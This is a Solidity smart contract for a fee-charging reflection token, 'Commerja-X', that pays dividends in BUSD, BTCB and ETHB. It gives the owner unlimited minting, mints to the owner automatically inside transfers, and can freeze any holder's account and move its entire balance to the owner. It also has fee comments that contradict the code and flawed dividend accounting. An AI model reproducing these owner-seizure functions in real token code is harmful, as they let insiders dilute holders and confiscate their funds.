// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ISEP20.sol";
import "./BUSDTracker.sol";
import "./BTCBTracker.sol";
import "./ETHBTracker.sol";
import "./IterableMapping.sol";
import "./PopulationTracker.sol";

import "../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../node_modules/@openzeppelin/contracts/utils/Address.sol";
import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "../node_modules/@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../node_modules/@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

// import "https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
// import "https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

/// @title CommerjaX
/// @author Akshay N A (CIS2459)

/* solium-disable-next-line */
contract CommerjaX is Context, ISEP20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    // Account Variables
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isFrozen;

    // Basic Variable Decleration
    uint256 private _totalSupply = 800000000000 * 10**18;
    string private _symbol = "X$WAPP";
    string private _name = "Commerja-X";
    uint8 private _decimals = 18;

    mapping(address => bool) private _isExcludedFromFee;

    // Fee Variables (x% of respectice Fee will be deducted during transaction)
    uint8 public txFee = 1; // 1.5% is taken as bank Fee
    uint8 public reflectionFee = 3; // 3% is taken as Reflection Fee
    uint8 public liquidityFee = 1; // 0.5% is taken as Auto Liquidity Fee
    uint8 public burnFee = 5; // 5% is automatically burned

    uint256 public txFeeAccumulated;
    uint256 public reflectionFeeAccumulated;
    uint256 public liquidityFeeAccumulated;
    uint256 public totalBurntFee;
    uint256 public totalTokenMinted;

    uint256 public numOfTokensToSellToAddLiquidity = 5000 * 10**18;

    /// TODO: Change the following wallet address before deploying
    address private _masterWallet =
        address(0xe121Ecd9C7b1c2e40cC16595e36782A8afD088E4);
    address private _teamWallet =
        address(0xd3484298560C2dC216ab9A3d95c472c739a4170F);

    // Dividend Variable
    enum ReflectionToken {
        BUSD,
        BTCB,
        ETHB
    }

    PopulationTracker public WorldPopulation;

    BUSDTracker public dividendTrackerBUSD;
    BTCBTracker public dividendTrackerBTCB;
    ETHBTracker public dividendTrackerETHB;

    address private BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address private BTCB = address(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    address private ETHB = address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);

    address private WBCH = address(0x8fF795a6F4D97E7887C79beA79aba5cc76444aDf);

    address[] public reflectionTokensAddresses = [BUSD, BTCB, ETHB];

    uint256 public gasForProcessing = 300000;

    // Liquidation Variable
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router02;

    uint256 public worldPopulation = 8000000000 * 10**18;
    uint256 public popLastUpdated;
    bool public autoUpdatePop = true;

    bool private _isSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    // Events
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenSwaped,
        uint256 bchReceived,
        uint256 tokensIntoLiquidity
    );
    event AccountFreeze(address[] indexed account, bool isFreezed);

    event ExcludeFromFees(address[] indexed account, bool isExcluded);

    event SendDividends(uint256 tokensSwapped, uint256 amount);

    event UpdateDividendTracker(address newAddress, address oldAddress);

    event UpdatedworldPopulation(uint256 lastPrice, uint256 newPrice);

    event UpdateAutoPop(bool updated);

    event ProcessedDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    event UpdateUniswapV2Router(address newAddress, address oldAddress);

    event GasForProcessingUpdated(uint256 newValue, uint256 gasForProcessing);

    modifier onlyMaster() {
        require(
            _msgSender() == _masterWallet,
            "Ownable: caller is not the master"
        );
        _;
    }

    constructor() {
        dividendTrackerBUSD = new BUSDTracker();
        dividendTrackerBTCB = new BTCBTracker();
        dividendTrackerETHB = new ETHBTracker();

        // mint token to owner
        _balances[_msgSender()] = _totalSupply;

        // Initiate Pairing with MistSwap
        IUniswapV2Router02 _uniswapRouter02 = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        ); // Add mistswap address here
        uniswapV2Pair = IUniswapV2Factory(_uniswapRouter02.factory())
            .createPair(address(this), _uniswapRouter02.WETH());
        uniswapV2Router02 = _uniswapRouter02;

        //Exclude address from Fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(uniswapV2Router02)] = true;
        _isExcludedFromFee[_masterWallet] = true;
        _isExcludedFromFee[_teamWallet] = true;

        dividendTrackerBUSD.excludeFromDividends(address(dividendTrackerBUSD));
        dividendTrackerBUSD.excludeFromDividends(address(this));
        dividendTrackerBUSD.excludeFromDividends(address(0));
        dividendTrackerBUSD.excludeFromDividends(owner());
        dividendTrackerBUSD.excludeFromDividends(address(uniswapV2Router02));
        dividendTrackerBUSD.excludeFromDividends(_masterWallet);
        dividendTrackerBUSD.excludeFromDividends(_teamWallet);

        dividendTrackerBTCB.excludeFromDividends(address(dividendTrackerBTCB));
        dividendTrackerBTCB.excludeFromDividends(address(this));
        dividendTrackerBTCB.excludeFromDividends(address(0));
        dividendTrackerBTCB.excludeFromDividends(owner());
        dividendTrackerBTCB.excludeFromDividends(address(uniswapV2Router02));
        dividendTrackerBTCB.excludeFromDividends(_masterWallet);
        dividendTrackerBTCB.excludeFromDividends(_teamWallet);

        dividendTrackerETHB.excludeFromDividends(address(dividendTrackerETHB));
        dividendTrackerETHB.excludeFromDividends(address(this));
        dividendTrackerETHB.excludeFromDividends(address(0));
        dividendTrackerETHB.excludeFromDividends(owner());
        dividendTrackerETHB.excludeFromDividends(address(uniswapV2Router02));
        dividendTrackerETHB.excludeFromDividends(_masterWallet);
        dividendTrackerETHB.excludeFromDividends(_teamWallet);

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /// @notice Will receive any eth sent to the contract
    receive() external payable {}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function updateAutoPop(bool update) external onlyOwner {
        autoUpdatePop = update;
        emit UpdateAutoPop(update);
    }

    function updateMasterWallet(address newWallet)
        external
        onlyMaster
        returns (bool)
    {
        require(
            newWallet != address(0),
            "New master wallet cannot be zero address"
        );

        _isExcludedFromFee[_masterWallet] = false;

        _masterWallet = newWallet;

        _isExcludedFromFee[_masterWallet] = true;
        dividendTrackerBTCB.excludeFromDividends(_masterWallet);
        dividendTrackerBUSD.excludeFromDividends(_masterWallet);
        dividendTrackerETHB.excludeFromDividends(_masterWallet);

        return true;
    }

    function updateTeamWallet(address newWallet)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newWallet != address(0),
            "New team wallet cannot be zero address"
        );

        _isExcludedFromFee[_teamWallet] = false;

        _teamWallet = newWallet;

        _isExcludedFromFee[_teamWallet] = true;
        dividendTrackerBTCB.excludeFromDividends(_teamWallet);
        dividendTrackerBUSD.excludeFromDividends(_teamWallet);
        dividendTrackerETHB.excludeFromDividends(_teamWallet);

        return true;
    }

    function excludeMultipleAccountsFromFee(
        address[] calldata accounts,
        bool excluded
    ) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }

        emit ExcludeFromFees(accounts, excluded);
    }

    function setWorldPopulationContract(address contractAddress)
        public
        onlyOwner
        returns (bool)
    {
        WorldPopulation = PopulationTracker(address(contractAddress));
        return true;
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(
            newValue >= 200000 && newValue <= 500000,
            "CommerjaXTokens: gasForProcessing must be between 200,000 and 500,000"
        );
        require(
            newValue != gasForProcessing,
            "CommerjaXTokens: Cannot update gasForProcessing to same value"
        );
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function setTxFee(uint8 newTxFee) public onlyOwner {
        require(newTxFee <= 10, "Fee cannot be more than 10%");
        txFee = newTxFee;
    }

    function setRelectionFee(uint8 newReflectionFee) public onlyOwner {
        require(newReflectionFee <= 10, "Fee cannot be more than 10%");
        reflectionFee = newReflectionFee;
    }

    function setLiquidityFee(uint8 newLiquidityFee) public onlyOwner {
        require(newLiquidityFee <= 10, "Fee cannot be more than 10%");
        liquidityFee = newLiquidityFee;
    }

    function setBurnFee(uint8 newBurnFee) public onlyOwner {
        require(newBurnFee <= 10, "Fee cannot be more than 10%");
        burnFee = newBurnFee;
    }

    function setSwapAndLiquifyEnabled(bool enabled) external onlyOwner {
        swapAndLiquifyEnabled = enabled;
        emit SwapAndLiquifyEnabledUpdated(enabled);
    }

    function getTotalDividendsDistributed()
        external
        view
        returns (
            uint256 busd,
            uint256 btcb,
            uint256 ethb
        )
    {
        busd = dividendTrackerBUSD.totalDividendsDistributed();
        btcb = dividendTrackerBTCB.totalDividendsDistributed();
        ethb = dividendTrackerETHB.totalDividendsDistributed();
    }

    function withdrawableividendOf(address account)
        public
        view
        returns (
            uint256 busd,
            uint256 btcb,
            uint256 ethb
        )
    {
        busd = dividendTrackerBUSD.withdrawableDividendOf(account);
        btcb = dividendTrackerBTCB.withdrawableDividendOf(account);
        ethb = dividendTrackerETHB.withdrawableDividendOf(account);
    }

    function withdrawnDividendOf(address account)
        public
        view
        returns (
            uint256 busd,
            uint256 btcb,
            uint256 ethb
        )
    {
        busd = dividendTrackerBUSD.withdrawnDividendOf(account);
        btcb = dividendTrackerBTCB.withdrawnDividendOf(account);
        ethb = dividendTrackerETHB.withdrawnDividendOf(account);
    }

    function excludeFromDividends(address account) external onlyOwner {
        dividendTrackerBUSD.excludeFromDividends(account);
        dividendTrackerBTCB.excludeFromDividends(account);
        dividendTrackerETHB.excludeFromDividends(account);
    }

    function getAccountDividendsInfo(
        address account,
        ReflectionToken reflectionToken
    )
        external
        view
        returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        if (reflectionToken == ReflectionToken.BUSD) {
            return dividendTrackerBUSD.getAccount(account);
        } else if (reflectionToken == ReflectionToken.BTCB) {
            return dividendTrackerBTCB.getAccount(account);
        } else {
            return dividendTrackerETHB.getAccount(account);
        }
    }

    function processDividendTracker(uint256 gas) external {
        (
            uint256 iterationsBTCB,
            uint256 claimsBTCB,
            uint256 lastProcessedIndexBTCB
        ) = dividendTrackerBTCB.process(gas);
        emit ProcessedDividendTracker(
            iterationsBTCB,
            claimsBTCB,
            lastProcessedIndexBTCB,
            false,
            gas,
            msg.sender
        );

        (
            uint256 iterationsBUSD,
            uint256 claimsBUSD,
            uint256 lastProcessedIndexBUSD
        ) = dividendTrackerBUSD.process(gas);
        emit ProcessedDividendTracker(
            iterationsBUSD,
            claimsBUSD,
            lastProcessedIndexBUSD,
            false,
            gas,
            msg.sender
        );

        (
            uint256 iterationsETHB,
            uint256 claimsETHB,
            uint256 lastProcessedIndexETHB
        ) = dividendTrackerETHB.process(gas);
        emit ProcessedDividendTracker(
            iterationsETHB,
            claimsETHB,
            lastProcessedIndexETHB,
            false,
            gas,
            msg.sender
        );
    }

    function claim() external {
        dividendTrackerBUSD.processAccount(payable(msg.sender), false);
        dividendTrackerBTCB.processAccount(payable(msg.sender), false);
        dividendTrackerETHB.processAccount(payable(msg.sender), false);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function updateWorldPopulation() internal {
        WorldPopulation.multipleData();

        uint256 pop = WorldPopulation.currentPopulation();

        if (pop > 0 && block.timestamp >= (popLastUpdated + 86400)) {
            emit UpdatedworldPopulation(worldPopulation, pop);
            worldPopulation = pop;
            popLastUpdated = block.timestamp;
        }
    }

    function updateWorldPopulation(uint256 newCount) external onlyOwner {
        require(
            !autoUpdatePop,
            "Auto Pop update should be turned off before calluing this function"
        );
        require(
            newCount != worldPopulation,
            "New count cannot be the old count"
        );
        require(newCount >= 0, "new Price cannot be negative");
        emit UpdatedworldPopulation(worldPopulation, newCount);
        worldPopulation = newCount;
    }

    function antiDeflationaryMechanism(uint256 amount) external onlyOwner {
        require(amount != 0, "amount cannot be zero");

        _totalSupply = _totalSupply.add(amount);
        _balances[owner()] = _balances[owner()].add(amount);

        totalTokenMinted = totalTokenMinted.add(amount);

        emit Transfer(address(0), owner(), amount);
    }

    function antiInflationaryMechanism(uint256 amount) external {
        require(amount != 0, "amount cannot be zero");

        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);

        totalBurntFee = totalBurntFee.add(amount);

        emit Transfer(msg.sender, address(0), amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(
            owner != address(0),
            "CommerjaXTokens:: approve from the zero address"
        );
        require(
            spender != address(0),
            "CommerjaXTokens:: approve to the zero address"
        );

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "CommerjaXTokens: Cannot be zero address");
        require(to != address(0), "CommerjaXTokens: Cannot be zero address");
        require(amount > 0, " CommerjaXTokens: Amount cannot be zero");
        require(
            !_isFrozen[from] && !_isFrozen[to],
            "CommerjaXTokens: Frozen Account Detected"
        );

        bool takeFee = true;

        if (autoUpdatePop) {
            updateWorldPopulation();
        }

        // Auto Liquidity Code goes here.

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
        if (
            reflectionFeeAccumulated >= numOfTokensToSellToAddLiquidity &&
            !_isSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            _isSwapAndLiquify = true;

            if (swapAndLiquify(liquidityFeeAccumulated)) {
                liquidityFeeAccumulated = 0;
            }

            if (swapAndSendToFee(txFeeAccumulated)) {
                txFeeAccumulated = 0;
            }

            if (swapAndSendDividends(reflectionFeeAccumulated)) {
                reflectionFeeAccumulated = 0;
            }

            _isSwapAndLiquify = false;
        }

        if (takeFee) {
            // taxFee = [txFee[0], reflectionFee[1], liquidityFee[2], burnFee[3]];
            uint256[] memory taxFee = new uint256[](3);
            taxFee = _getValues(amount);
            uint256 depositAmount;

            if (worldPopulation < _totalSupply) {
                depositAmount = amount
                    .sub(taxFee[0])
                    .sub(taxFee[1])
                    .sub(taxFee[2])
                    .sub(taxFee[3]);

                _balances[from] = _balances[from].sub(amount);
                _balances[to] = _balances[to].add(depositAmount);

                _balances[address(0)] = _balances[address(0)].add(taxFee[3]);
                _totalSupply = _totalSupply.sub(taxFee[3]);
                totalBurntFee = totalBurntFee.add(taxFee[3]);

                emit Transfer(_msgSender(), address(0), taxFee[3]);
            } else {
                depositAmount = amount.sub(taxFee[0]).sub(taxFee[1]).sub(
                    taxFee[2]
                );

                _balances[from] = _balances[from].sub(amount);
                _balances[to] = _balances[to].add(depositAmount);

                uint256 difference = worldPopulation.sub(_totalSupply);

                _balances[owner()] = _balances[owner()].add(difference);
                _totalSupply = _totalSupply.add(difference);

                totalTokenMinted = totalTokenMinted.add(difference);

                emit Transfer(address(0), owner(), difference);
            }
            takeFees(taxFee[0], taxFee[1], taxFee[2]);
        } else {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
        }

        try
            dividendTrackerBUSD.setBalance(payable(from), balanceOf(from))
        {} catch {}
        try
            dividendTrackerBUSD.setBalance(payable(to), balanceOf(to))
        {} catch {}

        try
            dividendTrackerBTCB.setBalance(payable(from), balanceOf(from))
        {} catch {}
        try
            dividendTrackerBTCB.setBalance(payable(to), balanceOf(to))
        {} catch {}

        try
            dividendTrackerETHB.setBalance(payable(from), balanceOf(from))
        {} catch {}
        try
            dividendTrackerETHB.setBalance(payable(to), balanceOf(to))
        {} catch {}

        if (!_isSwapAndLiquify) {
            uint256 gas = gasForProcessing;

            try dividendTrackerBUSD.process(gas) returns (
                uint256 iterations,
                uint256 claims,
                uint256 lastProcessedIndex
            ) {
                emit ProcessedDividendTracker(
                    iterations,
                    claims,
                    lastProcessedIndex,
                    true,
                    gas,
                    msg.sender
                );
            } catch {}

            try dividendTrackerBTCB.process(gas) returns (
                uint256 iterations,
                uint256 claims,
                uint256 lastProcessedIndex
            ) {
                emit ProcessedDividendTracker(
                    iterations,
                    claims,
                    lastProcessedIndex,
                    true,
                    gas,
                    msg.sender
                );
            } catch {}

            try dividendTrackerETHB.process(gas) returns (
                uint256 iterations,
                uint256 claims,
                uint256 lastProcessedIndex
            ) {
                emit ProcessedDividendTracker(
                    iterations,
                    claims,
                    lastProcessedIndex,
                    true,
                    gas,
                    msg.sender
                );
            } catch {}
        }
    }

    function swapAndSendToFee(uint256 tokenAmount) private returns (bool) {
        uint256 initialBalance = IERC20(WBCH).balanceOf(address(this));

        // Swap tokens for BCH
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router02.WETH();
        path[2] = WBCH;

        _approve(address(this), address(uniswapV2Router02), tokenAmount);

        // make the swap
        uniswapV2Router02.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );

        // How much ETH did the code just swapped
        uint256 newBalance = IERC20(WBCH).balanceOf(address(this)).sub(
            initialBalance
        );

        return IERC20(WBCH).transfer(address(_teamWallet), newBalance);
    }

    function swapTokensForReflectionToken(
        uint256 tokenAmount,
        ReflectionToken reflectionToken
    ) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router02.WETH();
        path[2] = reflectionTokensAddresses[uint256(reflectionToken)];

        _approve(address(this), address(uniswapV2Router02), tokenAmount);

        // make the swap
        uniswapV2Router02.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }

    function swapAndSendDividends(uint256 tokens) private returns (bool) {
        uint256 BUSDTokens = tokens.div(reflectionTokensAddresses.length);
        uint256 BTCBTokens = tokens.div(reflectionTokensAddresses.length);
        uint256 ETHBTokens = tokens.sub(BUSDTokens).sub(BTCBTokens);

        uint256 initialBalance = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.BUSD)]
        ).balanceOf(address(this));

        // Swap tokens for ETH
        swapTokensForReflectionToken(BUSDTokens, ReflectionToken.BUSD);
        swapTokensForReflectionToken(BTCBTokens, ReflectionToken.BTCB);
        swapTokensForReflectionToken(ETHBTokens, ReflectionToken.ETHB);

        uint256 dividendsBUSD = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.BUSD)]
        ).balanceOf(address(this)).sub(initialBalance);
        uint256 dividendsBTCB = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.BTCB)]
        ).balanceOf(address(this));
        uint256 dividendsETHB = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.ETHB)]
        ).balanceOf(address(this));

        bool successBUSD = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.BUSD)]
        ).transfer(address(dividendTrackerBUSD), dividendsBUSD);
        bool successBTCB = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.BTCB)]
        ).transfer(address(dividendTrackerBTCB), dividendsBTCB);
        bool successETHB = IERC20(
            reflectionTokensAddresses[uint256(ReflectionToken.ETHB)]
        ).transfer(address(dividendTrackerETHB), dividendsETHB);

        if (successBUSD) {
            dividendTrackerBUSD.distributeDividends(dividendsBUSD);
            emit SendDividends(BUSDTokens, dividendsBUSD);
        }
        if (successBTCB) {
            dividendTrackerBTCB.distributeDividends(dividendsBTCB);
            emit SendDividends(BTCBTokens, dividendsBTCB);
        }
        if (successETHB) {
            dividendTrackerETHB.distributeDividends(dividendsETHB);
            emit SendDividends(ETHBTokens, dividendsETHB);
        }
        return true;
    }

    function swapAndLiquify(uint256 contractTokenBalance)
        private
        returns (bool)
    {
        // Split current baalnce into 2 halfs.
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // Swap tokens for ETH
        swapTokensForEth(half);

        // How much ETH did the code just swapped
        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);

        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router02), tokenAmount);

        uniswapV2Router02.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate MisSwap pair path of token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router02.WETH();

        _approve(address(this), address(uniswapV2Router02), tokenAmount);

        uniswapV2Router02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function takeFees(
        uint256 txFees,
        uint256 reflectionFees,
        uint256 liquidityFees
    ) private {
        txFeeAccumulated = txFeeAccumulated.add(txFees);
        reflectionFeeAccumulated = reflectionFeeAccumulated.add(reflectionFees);
        liquidityFeeAccumulated = liquidityFeeAccumulated.add(liquidityFees);

        _balances[address(this)] = _balances[address(this)]
            .add(txFees)
            .add(reflectionFees)
            .add(liquidityFees);
    }

    function _getValues(uint256 amount)
        private
        view
        returns (uint256[] memory)
    {
        uint256[] memory values = new uint256[](4);

        // values = [txFee[0], reflectionFee[1], liquidityFee[2], burnFee[3]];

        values[0] = amount.mul(txFee).div(100);
        values[1] = amount.mul(reflectionFee).div(100);
        values[2] = amount.mul(liquidityFee).div(100);
        values[3] = amount.mul(burnFee).div(100);

        return values;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "Transfer amount exceeds allownce"
            )
        );
        return true;
    }

    // Security Functions

    /// @notice This function will freeze the given account
    /// @param accounts list of account that needs to be freezed
    /// @param enabled bool to determine freeze adn unfreeze status
    function freezeMultipleAccount(address[] calldata accounts, bool enabled)
        external
        onlyMaster
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            require(accounts[i] != address(0), "Cannot freeze zero account");
            _isFrozen[accounts[i]] = enabled;
        }

        emit AccountFreeze(accounts, enabled);
    }

    /// @notice This function should be used with atmost care.
    /// This is just a security feature and should be used only in time of hack.
    /// @param account the frozen account from with the the tokens should be drained
    /// @return true on success.
    function withdrawAllFundsFromFrozenAccount(address account)
        external
        onlyMaster
        returns (bool)
    {
        require(account != address(0), "Cannot be zero account");
        require(
            _isFrozen[account] == true,
            "CommerjaXTokens: Account must be frozen"
        );

        uint256 initalAccountBalance = _balances[account];

        _balances[owner()] = _balances[owner()].add(initalAccountBalance);
        _balances[account] = 0;

        emit Transfer(account, owner(), initalAccountBalance);
        return true;
    }
}
